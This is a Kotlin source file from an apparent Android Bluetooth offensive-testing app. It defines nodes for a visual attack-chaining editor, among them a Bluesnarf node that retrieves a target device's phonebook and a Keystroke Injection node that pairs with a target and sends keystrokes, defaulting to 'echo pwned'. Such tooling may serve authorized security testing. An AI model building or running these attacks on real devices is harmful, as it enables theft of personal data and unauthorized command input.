package com.hereliesaz.blusnu.ui.attackchaining.nodes

import android.bluetooth.BluetoothAdapter
import androidx.compose.ui.geometry.Offset
import com.hereliesaz.blusnu.data.ActionLogger
import com.hereliesaz.blusnu.data.BluesnarfingModule
import com.hereliesaz.blusnu.data.KeystrokeInjectionModule
import com.hereliesaz.blusnu.data.TargetDevice
import kotlinx.coroutines.delay

interface AttackNode {
    val id: NodeId
    val position: Offset
    val inputs: List<NodeConnector>
    val outputs: List<NodeConnector>
    val name: String
    val title: String
    val targetDevice: TargetDevice?

    suspend fun execute(context: ExecutionContext): ExecutionResult

    fun copy(position: Offset): AttackNode
    fun withTarget(device: TargetDevice): AttackNode
}

data class ExecutionContext(
    val lastResult: String? = null,
    val targetDevice: TargetDevice? = null,
    val loopCounters: Map<NodeId, Int> = emptyMap(),
    val services: Map<String, Any> = emptyMap(),
    /** Data passed between connected nodes keyed by connector id. */
    val connectorData: Map<String, String> = emptyMap()
)

data class ExecutionResult(
    val output: String,
    val targetDevice: TargetDevice? = null,
    val nextPort: String? = null
)

typealias NodeId = String

/**
 * Role of a connector: INPUT receives data, OUTPUT sends data.
 * Connections are only valid from an OUTPUT connector to an INPUT connector.
 */
enum class ConnectorRole { INPUT, OUTPUT }

data class NodeConnector(val id: String, val nodeId: NodeId, val role: ConnectorRole)

/**
 * Serialization-safe position data class.
 * Compose [Offset] does not serialize correctly with Gson; this plain data class
 * is used for persistence and converted to/from [Offset] at the UI boundary.
 */
data class NodePosition(val x: Float, val y: Float) {
    fun toOffset(): Offset = Offset(x, y)

    companion object {
        fun fromOffset(offset: Offset): NodePosition = NodePosition(offset.x, offset.y)
    }
}

// Service registry keys
object ChainServices {
    const val BLUETOOTH_ADAPTER = "bluetoothAdapter"
    const val BLUESNARFING_MODULE = "bluesnarfingModule"
    const val KEYSTROKE_INJECTION_MODULE = "keystrokeInjectionModule"
}

// --- Node Implementations ---

data class StartNode(
    override val id: NodeId,
    override val position: Offset = Offset.Zero,
    override val inputs: List<NodeConnector> = emptyList(),
    override val outputs: List<NodeConnector> = listOf(NodeConnector("start", id, ConnectorRole.OUTPUT)),
    override val name: String = "Start",
    override val targetDevice: TargetDevice? = null
) : AttackNode {
    override val title: String = "Start"
    override suspend fun execute(context: ExecutionContext): ExecutionResult {
        ActionLogger.log("Chain execution started")
        return ExecutionResult("Chain started", targetDevice)
    }
    override fun copy(position: Offset): AttackNode = this.copy(position = position)
    override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
}

data class IfElseNode(
    override val id: NodeId,
    override val position: Offset = Offset.Zero,
    override val inputs: List<NodeConnector> = listOf(NodeConnector("condition", id, ConnectorRole.INPUT)),
    override val outputs: List<NodeConnector> = listOf(
        NodeConnector("true", id, ConnectorRole.OUTPUT),
        NodeConnector("false", id, ConnectorRole.OUTPUT)
    ),
    override val name: String = "If/Else",
    override val targetDevice: TargetDevice? = null
) : AttackNode {
    override val title: String = "If/Else"
    override suspend fun execute(context: ExecutionContext): ExecutionResult {
        val condition = (targetDevice ?: context.targetDevice) != null
        val branch = if (condition) "true" else "false"
        return ExecutionResult(
            output = "Condition: target=${if (condition) "present" else "absent"} -> $branch",
            targetDevice = context.targetDevice,
            nextPort = branch
        )
    }
    override fun copy(position: Offset): AttackNode = this.copy(position = position)
    override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
}

data class WaitNode(
    override val id: NodeId,
    override val position: Offset = Offset.Zero,
    override val inputs: List<NodeConnector> = listOf(NodeConnector("in", id, ConnectorRole.INPUT)),
    override val outputs: List<NodeConnector> = listOf(NodeConnector("out", id, ConnectorRole.OUTPUT)),
    override val name: String = "Wait",
    override val targetDevice: TargetDevice? = null,
    val durationMs: Long = 1000
) : AttackNode {
    override val title: String = "Wait"
    override suspend fun execute(context: ExecutionContext): ExecutionResult {
        delay(durationMs)
        return ExecutionResult("Waited ${durationMs}ms", context.targetDevice)
    }
    override fun copy(position: Offset): AttackNode = this.copy(position = position)
    override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
}

data class LoopNode(
    override val id: NodeId,
    override val position: Offset = Offset.Zero,
    override val inputs: List<NodeConnector> = listOf(NodeConnector("start", id, ConnectorRole.INPUT)),
    override val outputs: List<NodeConnector> = listOf(
        NodeConnector("loop_body", id, ConnectorRole.OUTPUT),
        NodeConnector("end", id, ConnectorRole.OUTPUT)
    ),
    override val name: String = "Loop",
    override val targetDevice: TargetDevice? = null,
    val maxIterations: Int = 3
) : AttackNode {
    override val title: String = "Loop"
    override suspend fun execute(context: ExecutionContext): ExecutionResult {
        val iteration = context.loopCounters[id] ?: 0
        return if (iteration < maxIterations) {
            ExecutionResult(
                output = "Loop iteration ${iteration + 1}/$maxIterations",
                targetDevice = context.targetDevice,
                nextPort = "loop_body"
            )
        } else {
            ExecutionResult(
                output = "Loop finished after $maxIterations iterations",
                targetDevice = context.targetDevice,
                nextPort = "end"
            )
        }
    }
    override fun copy(position: Offset): AttackNode = this.copy(position = position)
    override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
}

// --- Action Nodes ---

/**
 * Pass-through node: forwards the pre-selected target (or reports none).
 * Renamed from "Scan BLE Devices" because this node does not perform actual BLE
 * scanning -- it simply relays the target device already assigned via the UI.
 */
data class ScanBleNode(
    override val id: NodeId,
    override val position: Offset = Offset.Zero,
    override val inputs: List<NodeConnector> = listOf(NodeConnector("trigger", id, ConnectorRole.INPUT)),
    override val outputs: List<NodeConnector> = listOf(NodeConnector("devices", id, ConnectorRole.OUTPUT)),
    override val name: String = "Target Pass-through",
    override val targetDevice: TargetDevice? = null
) : AttackNode {
    override val title: String = "Target Pass-through"
    override suspend fun execute(context: ExecutionContext): ExecutionResult {
        ActionLogger.log("Chain: target pass-through step reached")
        val target = targetDevice ?: context.targetDevice
        return if (target != null) {
            ExecutionResult("Pass-through: using target ${target.name ?: target.macAddress}", target)
        } else {
            ExecutionResult("Pass-through: no target device selected -- select a target before running the chain", null)
        }
    }
    override fun copy(position: Offset): AttackNode = this.copy(position = position)
    override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
}

data class BluesnarfNode(
    override val id: NodeId,
    override val position: Offset = Offset.Zero,
    override val inputs: List<NodeConnector> = listOf(NodeConnector("target_mac", id, ConnectorRole.INPUT)),
    override val outputs: List<NodeConnector> = listOf(NodeConnector("data", id, ConnectorRole.OUTPUT)),
    override val name: String = "Bluesnarf",
    override val targetDevice: TargetDevice? = null
) : AttackNode {
    override val title: String = "Bluesnarf"
    @android.annotation.SuppressLint("MissingPermission")
    override suspend fun execute(context: ExecutionContext): ExecutionResult {
        val target = targetDevice ?: context.targetDevice
            ?: return ExecutionResult("Bluesnarf failed: no target device", null)

        val adapter = context.services[ChainServices.BLUETOOTH_ADAPTER] as? BluetoothAdapter
            ?: return ExecutionResult("Bluesnarf failed: Bluetooth not available", target)

        val module = context.services[ChainServices.BLUESNARFING_MODULE] as? BluesnarfingModule
            ?: return ExecutionResult("Bluesnarf failed: module not available", target)

        ActionLogger.log("Chain: Bluesnarfing ${target.macAddress}")
        val device = try {
            adapter.getRemoteDevice(target.macAddress)
        } catch (e: IllegalArgumentException) {
            return ExecutionResult("Bluesnarf failed: invalid MAC ${target.macAddress}", target)
        }

        val result = module.getPhonebook(device)
        return result.fold(
            onSuccess = { data ->
                ActionLogger.log("Chain: Bluesnarf succeeded on ${target.macAddress}")
                ExecutionResult("Bluesnarf: retrieved ${data.length} bytes from ${target.macAddress}", target)
            },
            onFailure = { e ->
                ActionLogger.log("Chain: Bluesnarf failed on ${target.macAddress}: ${e.message}")
                ExecutionResult("Bluesnarf failed: ${e.message}", target)
            }
        )
    }
    override fun copy(position: Offset): AttackNode = this.copy(position = position)
    override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
}

data class KeystrokeInjectionNode(
    override val id: NodeId,
    override val position: Offset = Offset.Zero,
    override val inputs: List<NodeConnector> = listOf(
        NodeConnector("target_mac", id, ConnectorRole.INPUT),
        NodeConnector("payload", id, ConnectorRole.INPUT)
    ),
    override val outputs: List<NodeConnector> = listOf(NodeConnector("success", id, ConnectorRole.OUTPUT)),
    override val name: String = "Keystroke Injection",
    override val targetDevice: TargetDevice? = null,
    val payload: String = ""
) : AttackNode {
    override val title: String = "Keystroke Injection"
    override suspend fun execute(context: ExecutionContext): ExecutionResult {
        val target = targetDevice ?: context.targetDevice
            ?: return ExecutionResult("Keystroke Injection failed: no target device", null)

        val module = context.services[ChainServices.KEYSTROKE_INJECTION_MODULE] as? KeystrokeInjectionModule
            ?: return ExecutionResult("Keystroke Injection failed: module not available", target)

        ActionLogger.log("Chain: Keystroke injection on ${target.macAddress}")
        val paired = module.attemptPairing(target)
        if (!paired) {
            return ExecutionResult("Keystroke Injection: pairing failed on ${target.macAddress}", target)
        }

        // 13.12: Read payload from the incoming connection's ExecutionContext data.
        // If the "payload" connector has data wired from an upstream node, use it.
        // Otherwise fall back to the node's configured default, then lastResult.
        val connectorPayload = context.connectorData["payload"]
        val text = when {
            !connectorPayload.isNullOrEmpty() -> connectorPayload
            payload.isNotEmpty() -> payload
            else -> context.lastResult ?: "echo pwned"
        }
        val sent = module.sendKeystrokes(text)
        return if (sent) {
            ActionLogger.log("Chain: Keystrokes sent to ${target.macAddress}")
            ExecutionResult("Keystroke Injection: sent ${text.length} chars to ${target.macAddress}", target)
        } else {
            ExecutionResult("Keystroke Injection: send failed on ${target.macAddress}", target)
        }
    }
    override fun copy(position: Offset): AttackNode = this.copy(position = position)
    override fun withTarget(device: TargetDevice): AttackNode = this.copy(targetDevice = device)
}
